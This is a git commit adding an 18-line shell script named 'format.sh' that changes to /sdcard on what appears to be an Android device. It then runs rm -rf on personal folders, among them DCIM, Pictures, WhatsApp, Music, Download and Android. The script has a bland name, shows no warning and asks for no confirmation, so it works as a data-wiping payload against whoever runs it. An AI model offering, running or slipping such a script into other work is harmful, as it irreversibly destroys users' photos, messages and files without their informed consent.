de6d1f3f6e146e5ae297a0d84fdfad0998d80455
Razor Kenway <razorkenway.98@gmail.com>
2020-10-13 17:45:01 +0530

    Create format.sh

---
+++ format.sh
@@ -0,0 +1,18 @@
+cd
+clear
+cd /sdcard
+rm -rf Android
+rm -rf DCIM
+rm -rf bluetooth
+rm -rf data
+rm -rf Download
+rm -rf Movies
+rm -rf Mp3
+rm -rf Music
+rm -rf Video
+rm -rf Picture
+rm -rf Pictures
+rm -rf Shareit
+rm -rf WhatsApp
+rm -rf WhatsApp1
+rm -rf Newfolder
